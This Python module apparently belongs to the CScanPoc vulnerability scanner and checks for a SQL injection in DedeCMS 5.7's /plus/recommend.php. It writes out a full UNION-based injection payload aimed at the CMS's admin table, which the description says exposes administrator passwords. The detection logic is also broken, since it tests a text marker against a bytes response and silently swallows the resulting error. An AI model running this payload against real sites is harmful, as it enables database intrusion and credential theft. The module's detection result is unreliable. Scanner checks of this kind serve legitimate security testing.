# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0004'  # 平台漏洞编号，留空
    name = '织梦CMS /plus/recommend.php 存在SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-28'  # 漏洞公布时间
    desc = '''
        DedeCMS 5.7 /plus/recommend.php处存在一个sql注入漏洞，可以直接管理员账户密码。
    '''  # 漏洞描述
    ref = 'http://www.freebuf.com/sectool/27206.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '5.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '860e20bd-c987-4281-b526-f0f3ae35b46c'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\'%20%20or%20mid=@`\\'`"
                       "%20/*!50000union*//*!50000select*/1,2,3,(select%20%20CONCAT(md5(3134))+from+`%23@__admin`"
                       "%20limit+0,1),5,6,7,8,9%23@`\\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/"
                       "octet-stream&_FILES[type][size]=111")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '35937e34256cf4e5b2f7da08871d2a0b' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
